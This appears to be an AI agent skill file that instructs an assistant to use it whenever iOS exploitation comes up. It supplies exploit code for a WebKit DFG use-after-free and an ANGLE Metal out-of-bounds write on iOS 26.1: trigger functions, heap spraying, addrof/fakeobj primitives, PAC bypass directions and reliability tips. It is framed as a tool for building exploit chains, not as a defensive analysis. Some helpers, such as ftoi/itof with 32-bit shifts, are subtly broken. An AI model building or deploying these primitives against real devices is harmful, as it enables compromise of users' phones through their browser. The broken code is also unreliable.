---
name: ios-webkit-ANGLE-exploit
description: iOS 26.1 exploitation primitives using WebKit DFG Store-Barrier UAF (CVE-2025-43529) and ANGLE Metal PBO OOB (CVE-2025-14174). Use this skill whenever the user mentions iOS exploitation, WebKit vulnerabilities, ANGLE bugs, use-after-free, out-of-bounds writes, PAC constraints, addrof/fakeobj primitives, or any iOS security research involving JavaScript engine exploits. This is the go-to skill for building iOS exploitation chains on arm64e.
---

# iOS 26.1 WebKit + ANGLE Exploitation Primitives

This skill provides exploitation primitives for iOS 26.1 (arm64e) using two complementary vulnerabilities:

1. **WebKit DFG Store-Barrier UAF** (CVE-2025-43529) - Memory corruption via missing write barriers
2. **ANGLE Metal PBO OOB** (CVE-2025-14174) - Out-of-bounds write via under-allocated staging buffer

## Quick Start

```javascript
// 1. Trigger the UAF
triggerUAF(true, 100);

// 2. Reclaim freed butterfly with array spray
sprayArrays();

// 3. Build addrof/fakeobj primitives
const addr = ftoi(unboxed_arr[0]);
unboxed_arr[0] = itof(addr);
const fake = boxed_arr[0];
```

## Vulnerability 1: DFG Store-Barrier UAF

### Root Cause
In `DFGStoreBarrierInsertionPhase.cpp`, when a **Phi node is marked escaped while its Upsilon inputs are not**, the compiler skips inserting write barriers on subsequent object stores. Under GC pressure, this allows JSC to free still-reachable objects.

### Trigger Pattern

```javascript
function triggerUAF(flag, allocCount) {
    // Tenure object A in old space
    const A = {p0: 0x41414141, p1: 1.1, p2: 2.2};
    arr[arr_index] = A;
    
    // Force Date to materialize a butterfly (the target to free)
    const a = new Date(1111); 
    a[0] = 1.1;  // Indexed access creates butterfly

    // Apply GC pressure to widen the race window
    for (let j = 0; j < allocCount; ++j) {
        forGC.push(new ArrayBuffer(0x800000));
    }

    // Set up Phi/Upsilon escape mismatch
    const b = {p0: 0x42424242, p1: 1.1};
    let f = b; 
    if (flag) f = 1.1;  // Phi escapes, Upsilon not escaped
    A.p1 = f;           // Missing barrier state set up

    // GC race window
    for (let i = 0; i < 1e6; ++i) {}
    
    // Store without barrier → frees `a`/butterfly
    b.p1 = a;
}
```

### Key Requirements

| Requirement | Purpose |
|-------------|----------|
| Old space tenure | Exercises generational barriers |
| Indexed Date | Creates butterfly as free target |
| ArrayBuffer spray | Forces GC, widens race window |
| Phi/Upsilon mismatch | Prevents barrier insertion |

## Vulnerability 2: ANGLE Metal PBO OOB

### Root Cause
In `TextureMtl.cpp`, the Metal backend allocates the PBO staging buffer using `UNPACK_IMAGE_HEIGHT` instead of the real texture height. Supplying a tiny unpack height then issuing a large `texImage2D` causes a staging-buffer OOB write.

### Trigger Pattern

```javascript
// Shrink staging buffer allocation
gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 16);  // alloc height

// staging = 256 * 16 * 4 = 16KB
// actual  = 256 * 256 * 4 = 256KB → ~240KB OOB

gl.texImage2D(
    gl.TEXTURE_2D, 
    0, 
    gl.DEPTH_COMPONENT32F,
    256, 256, 0, 
    gl.DEPTH_COMPONENT, 
    gl.FLOAT, 
    0
);
```

### Notes
- The WebGL2 PBO trigger is plumbed but may not be reliably observable on iOS 26.1
- Use this as a secondary primitive or for heap grooming

## PAC Constraints on arm64e

### The Problem
On iOS 26.1 (arm64e), these fields are PAC-signed:
- **TypedArray `m_vector`**
- **JSArray `butterfly`**

Forging fake objects with attacker-chosen pointers crashes with `EXC_BAD_ACCESS`/`EXC_ARM_PAC`.

### The Solution
The boxed/unboxed confusion primitive works because it **reuses legitimate signed butterflies**. You cannot introduce unsigned attacker pointers directly.

### What Works
- ✅ `addrof` - Leak object addresses
- ✅ `fakeobj` - Reinterpret existing objects
- ✅ 20+ address leaks per run
- ✅ Inline-slot read/write (on known inline fields)

### What Doesn't Work Yet
- ❌ Generalized `read64`/`write64` via inline-slot backings
- ❌ Direct pointer forgery (PAC authentication fails)

## Exploitation Primitives

### Boxed/Unboxed Confusion Setup

```javascript
// After UAF triggers and butterfly is freed
function sprayArrays() {
    // Spray to reclaim freed slab
    for (let i = 0; i < 1000; i++) {
        boxed_arr[i] = new Object();
        unboxed_arr[i] = 0.0;
    }
}

// Build primitives
boxed_arr[0] = obj;                    // Store as boxed pointer
const addr = ftoi(unboxed_arr[0]);     // Read as float64 → addr leak
unboxed_arr[0] = itof(addr);           // Write pointer bits as float
const fake = boxed_arr[0];             // Reinterpret as object → fakeobj
```

### Helper Functions

```javascript
// Float64 ↔ Pointer conversion
function ftoi(f) {
    const view = new Float64Array(1);
    view[0] = f;
    return new Uint32Array(view.buffer)[0] | 
           (new Uint32Array(view.buffer)[1] << 32);
}

function itof(i) {
    const view = new Uint32Array(2);
    view[0] = i & 0xFFFFFFFF;
    view[1] = (i >> 32) & 0xFFFFFFFF;
    return new Float64Array(view.buffer)[0];
}
```

## PAC Bypass Ideas

These are research directions, not confirmed working:

1. **JIT paths that skip auth** - Find code paths where PAC authentication is bypassed
2. **Gadgets that sign attacker pointers** - Use PAC signing instructions in JIT code
3. **Pivot through ANGLE OOB** - Use the OOB write to corrupt PAC-protected structures

## Debugging Tips

### Verify UAF Trigger
```javascript
// Check if butterfly was freed by attempting to access it
try {
    console.log(a[0]);  // Should crash or return garbage if freed
} catch(e) {
    console.log("UAF likely triggered");
}
```

### Verify Primitive Works
```javascript
// Leak known address
const known = {x: 1};
const leaked = ftoi(unboxed_arr[0]);
console.log("Leaked: 0x" + leaked.toString(16));

// Verify fakeobj
const fake = boxed_arr[0];
console.log(fake.x);  // Should work if primitive is correct
```

## References

- [WebKit-UAF-ANGLE-OOB-Analysis](https://github.com/zeroxjf/WebKit-UAF-ANGLE-OOB-Analysis)
- [jir4vv1t/CVE-2025-43529](https://github.com/jir4vv1t/CVE-2025-43529)
- CVE-2025-43529: WebKit DFG Store-Barrier UAF
- CVE-2025-14174: ANGLE Metal PBO OOB

## Common Pitfalls

1. **Not enough GC pressure** - Increase `allocCount` if UAF doesn't trigger
2. **Wrong element kinds** - Ensure arrays have different element kinds for confusion
3. **PAC-signed fields** - Don't try to forge pointers directly; reuse existing butterflies
4. **Timing sensitivity** - The UAF is race-based; may need multiple attempts
